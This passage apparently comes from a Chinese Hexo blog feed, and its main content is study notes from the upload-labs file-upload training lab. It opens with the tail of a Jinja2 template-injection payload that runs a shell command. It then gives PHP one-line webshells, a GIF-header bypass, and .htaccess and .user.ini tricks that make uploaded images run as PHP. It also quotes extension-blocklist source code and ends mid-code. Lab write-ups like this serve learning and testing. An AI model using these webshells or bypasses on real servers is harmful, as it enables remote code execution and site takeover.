class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;type flag.txt&quot;).read()&#x27;</span>) &#125;&#125;  <br>&#123;% endif %&#125;<br>&#123;% endif %&#125;<br>&#123;% endfor %&#125;<br>&#123;% endif %&#125;<br>&#123;% endfor %&#125;<br><span class="hljs-comment"># os模块都是从catching_warnings模块入手</span><br><span class="hljs-comment">#逻辑相关的用&#123;%%&#125;，变量相关的用&#123;&#123;&#125;&#125;</span><br></code></pre></td></tr></table></figure><h1 id="more"><a href="#more" class="headerlink" title="more"></a>more</h1><p>Jinjan2 基础语法</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-template-variable">&#123;% … %&#125;</span><br><span class="hljs-template-variable">&#123;&#123; … &#125;&#125;</span><br>&#123;<span class="hljs-comment"># … #&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>锻</title>
    <link href="/2022/04/05/%E9%94%BB/"/>
    <url>/2022/04/05/%E9%94%BB/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="089cb4784ce3ca3bc2b2057077efb02c0b9c48b0cc75253dc1970ef6e0769f54"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">三乾</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>随记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>http走私攻击</title>
    <link href="/2022/04/04/http%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/"/>
    <url>/2022/04/04/http%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>最近学习http走私攻击，原理相对简单，于是8再赘述，主要记录思路梳理&amp;&amp;攻击手法，方便抄个作业</p><p>原理: 觉得这篇文章讲得很8错，直接上链接—-<a href="https://paper.seebug.org/1048/">链接</a></p><p>老规矩，先挖个坑，然后不出意料的话就会一直留着不填….</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload_labs刷题&amp;&amp;文件上传漏洞笔记</title>
    <link href="/2022/03/28/upload-labs%E5%88%B7%E9%A2%98/"/>
    <url>/2022/03/28/upload-labs%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>因为这玩意网上wp一找一堆，所以只是自学的笔记&amp;&amp;payload作业，合并成1篇就够了</p><p>然后在做题的过程中发现基本能找到的<br>做的过程中好多关卡明明在看了源码后确定就是这个漏洞，却总是上传失败或者上传结果和预期8一样，推测是apache版本的缘故，搞得我很8爽，最后干脆学个姿势就8管了</p><h1 id="win11下phpstudy搭建环境，访问localhost时没有响应"><a href="#win11下phpstudy搭建环境，访问localhost时没有响应" class="headerlink" title="win11下phpstudy搭建环境，访问localhost时没有响应"></a>win11下phpstudy搭建环境，访问localhost时没有响应</h1><p>搭了个upload-labs靶场进行学习，搭建时遇到了玄学问题，在这里记录一下<br>用phpstyudy搭靶场时遇到了在联想和edge浏览器阔以访问localhost，但在火狐上却无法访问，想了好久没解决，最后rx<del>花了5min就</del>解决了，这里记录一下</p><p>上网查询火狐返回的报错: winspace[request not found]，然后提示应该是winspace这个 <del>8知有求用</del> 的win11新增软件占用了80端口，把它关了就行了</p><p>然而在查询占用了80端口的进程的pid后，却发现该pid并8是winspace，于是就迷了，解决8了。使用了”求援会长”机会*1，然后rx看了几分钟，在任务管理器里找到了winspace进程(1个win11新增的8知有啥鸟用的进程)，关闭，问题解决…..草(主要是一开始我也想是这玩意作妖，结果在占用80端口的pid里没有发现它，就把他排除了…)</p><h1 id="一些payoload作业"><a href="#一些payoload作业" class="headerlink" title="一些payoload作业"></a>一些payoload作业</h1><h2 id="htaccess常见"><a href="#htaccess常见" class="headerlink" title=".htaccess常见"></a>.htaccess常见</h2><p>我就匪夷所思啊，.htaccess在靶场上用就从来没有成功过….(编码问题? 还是? )</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">&lt;FilesMatch <span class="hljs-string">&quot;abc&quot;</span> &gt;<br>SetHandler application/x-httpd-php<br>&lt;<span class="hljs-string">/FilesMatch</span>&gt;<br><span class="hljs-string">//</span>意思是将当前目录下文件名为abc的文件都当php解析<br><br>SetHandler application/x-httpd-php<br><span class="hljs-string">//</span>让Apache将其他类型文件均以php格式解析<br><br>AddType application/x-httpd-php <span class="hljs-string">.jpg</span><br><span class="hljs-string">//</span>把<span class="hljs-string">.jpg</span>解析成<span class="hljs-string">.php</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_post</span>[<span class="hljs-string">&#x27;x&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a? &lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">1</span>])&lt;/script&gt;  <span class="hljs-comment">//文件幻术头绕过...</span><br><span class="hljs-comment">/*--------------*/</span><br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v&#x27;</span>]);&lt;/script&gt;  <span class="hljs-comment">//绕过&lt;?，许多命令可以换成这个写法 </span><br></code></pre></td></tr></table></figure><h1 id="pass-01-前端js验证"><a href="#pass-01-前端js验证" class="headerlink" title="pass-01 前端js验证"></a>pass-01 前端js验证</h1><p>首先查看提示: 是前端js检测，于是F12+F1召唤控制台，点击关闭js就行了<br>当然，也可以按其他wp的提示，修改js代码(可以将html代码全复制下来，再修改，打开，然后添加一点action之类)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> file = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&#x27;upload_file&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>;<br>    <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;请选择要上传的文件!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//定义允许上传的文件类型</span><br>    <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">&quot;.jpg|.png|.gif&quot;</span>;     <span class="hljs-comment">//把这行就改一下就阔以啦</span><br>    <span class="hljs-comment">//提取上传文件的类型</span><br>    <span class="hljs-keyword">var</span> ext_name = file.<span class="hljs-title function_">substring</span>(file.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));<br>    <span class="hljs-comment">//判断上传文件类型是否允许上传</span><br>    <span class="hljs-keyword">if</span> (allow_ext.<span class="hljs-title function_">indexOf</span>(ext_name) == -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="hljs-string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;<br>        <span class="hljs-title function_">alert</span>(errMsg);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="page-02-Content-Type-MIME验证"><a href="#page-02-Content-Type-MIME验证" class="headerlink" title="page-02 Content-Type(MIME验证)"></a>page-02 Content-Type(MIME验证)</h1><p>1种常见验证，即验证文件类型</p><h2 id="扫盲-MIME"><a href="#扫盲-MIME" class="headerlink" title="扫盲: MIME"></a>扫盲: MIME</h2><p>就是抓包时出现的Content-Type字段，比如这次上传1个.php文件，那发送的请求就是: Content-Type: application&#x2F;octet-stream<br>这里的application&#x2F;octet-stream表示字节流(内容是字节)</p><p>然后有些后端会对Content-Type进行验证，那么只要将其改为允许上传的类型就阔以了(比如: image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif)</p><h2 id="Content-Type抄作业"><a href="#Content-Type抄作业" class="headerlink" title="Content-Type抄作业"></a>Content-Type抄作业</h2><p>常见的媒体格式类型如下：</p><p>text&#x2F;html ： HTML格式<br>text&#x2F;plain ：纯文本格式<br>text&#x2F;xml ： XML格式<br>image&#x2F;gif ：gif图片格式<br>image&#x2F;jpeg ：jpg图片格式<br>image&#x2F;png：png图片格式<br>以application开头的媒体格式类型：</p><p>application&#x2F;xhtml+xml ：XHTML格式<br>application&#x2F;xml： XML数据格式<br>application&#x2F;atom+xml ：Atom XML聚合格式<br>application&#x2F;json： JSON数据格式<br>application&#x2F;pdf：pdf格式<br>application&#x2F;msword ： Word文档格式<br>application&#x2F;octet-stream ： 二进制流数据（如常见的文件下载）<br>application&#x2F;x-www-form-urlencoded ： <form encType=””>中默认的encType，form表单数据被编码为key&#x2F;value格式发送到服务器（表单默认的提交数据的格式）<br>另外一种常见的媒体格式是上传文件之时使用的：</p><p>multipart&#x2F;form-data ： 需要在表单中进行文件上传时，就需要使用该格式(比如上传.htaccess)</p><h1 id="page-03-黑名单绕过…"><a href="#page-03-黑名单绕过…" class="headerlink" title="page-03 黑名单绕过…"></a>page-03 黑名单绕过…</h1><p>查看提示: 本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！</p><p>ok…..这次试着自己做….<br>先试试大小写: p4yload.pHp，8行<br>再试试%00截断: p4yload.pHp%00.jpg，成功了，但是查看保存的文件名，并8是p4yload.pHp，导致蚁剑没法连，这是为什么呢?<br><img src="/images/%E5%88%B7%E9%A2%98/upload_labs(1).png"><br>试着用burp一次次改后缀名:<br>%00: 错<br>0x00: 错<br>.0x00: 错</p><p>??我不理解，但是这后面坑定会讲到，于是先放下</p><p>然后看wp，wp是猜测这阔能是黑名单，于是上传了.php5后缀(还可以是.phtml&#x2F;.phps&#x2F;.pht)<br>但是要想上传后能执行，要在自己的apache的httpd.conf文件写入</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">AddType application/x-httpd-php <span class="hljs-string">.php</span> <span class="hljs-string">.phtml</span> <span class="hljs-string">.phps</span> <span class="hljs-string">.php5</span> <span class="hljs-string">.pht</span><br></code></pre></td></tr></table></figure><h1 id="page-04-hatccess"><a href="#page-04-hatccess" class="headerlink" title="page-04 .hatccess"></a>page-04 .hatccess</h1><p>查看提示: 本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！</p><p>圈这么一堆，那就是黑名单了…<br>(这种时候1个1个试太麻烦，就感觉很有必要写一手自己的脚本了…)</p><p>然后wp的做法是: 利用.hatccess文件，这个文件利用的前提: 在apache的httpd.conf中将LoadModule rewrite_module modules&#x2F;mod_rewrite.so打开(即把对应的注释删除)还有AllowOverride All   实战中遇到没打开的就寄(比如像我这个就没打开，于是显示8出来…)<br>在上传的文件中写这样一句话:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br></code></pre></td></tr></table></figure><p>这样所有的文件就都会被当做php文件解析啦(但是原理8太明白….)<br>或者是: </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .jpg<br></code></pre></td></tr></table></figure><p>(写一个.htaccess文件去把.jpg解析成.php)<br>在传.htaccess的时候可能会遇到MIME验证，抓包随便改一下就行辽，8影响</p><h2 id="AllowOverride参数"><a href="#AllowOverride参数" class="headerlink" title="AllowOverride参数"></a>AllowOverride参数</h2><p>AllowOverride参数就是指明Apache服务器是否去找.htacess文件作为配置文件，如果设置为none,那么服务器将忽略.htacess文件，如果设置为All,那么所有在.htaccess文件里有的指令都将被重写</p><h1 id="page-05-user-ini"><a href="#page-05-user-ini" class="headerlink" title="page-05 user.ini"></a>page-05 user.ini</h1><p>查看hint: 上传目录存在php文件（readme.php）<br>查看源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么阔以看到，源码里进行了大小写转换，于是这关用大小写绕过是8行的….</p><p>那么根据源码提示，访问 upload&#x2F;readme.php，然后发现这样一句话:<br>该目录是上传文件保存，该文件为系统说明文件，请勿删除！</p><p>思路: 修改read.php文件。<br>那么如何通过上传文件修改readme.php呢?</p><p>上谷歌查，然后发现有个通过.ini文件来绕过的思路: .ini，就是配置文件的一种<br>想引发这个漏洞，有3个条件: 看求8懂，略</p><p>写个payload: </p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=<span class="hljs-number">666</span>.jpg<br></code></pre></td></tr></table></figure><p>这句话的意思: 所有的php文件都自动包含666.jpg文件</p><p>然后上传666.jpg，其内容为一句话木马—-<br>然后等待5min(刷新时间)，就阔以用蚁剑连了</p><h1 id="page-06-大小写绕过-后缀名8分大小写"><a href="#page-06-大小写绕过-后缀名8分大小写" class="headerlink" title="page-06 大小写绕过(后缀名8分大小写)"></a>page-06 大小写绕过(后缀名8分大小写)</h1><p>首先，盲注的话，觉得8科学，所以还是要代码审计<br>于是点击查看源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php">/ page-<span class="hljs-number">6</span><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);   <span class="hljs-comment">//返回.以及以后的部分</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空   首尾去空格，这是为什么捏</span><br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>; <span class="hljs-comment">//ok..这个是给文件换了个随机数名字</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>好，审完了，开始构造payload: 它进行首尾去空格的操作，然后给文件换了个随机数名字，这就算传上去了要怎么访问? 那自然是爆破<br>然后可以看到没有进行大小写转化，于是可以进行绕过</p><p>绕过之后看看upload的文件夹，发现上传成功了，但是名字是随机数，对于这个，可以用burp爆破进行访问，然后找到后用菜刀直连</p><h1 id="page-7-空格后缀绕过"><a href="#page-7-空格后缀绕过" class="headerlink" title="page-7 空格后缀绕过"></a>page-7 空格后缀绕过</h1><p>查看提示，没啥鸟用，于是查看源码: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 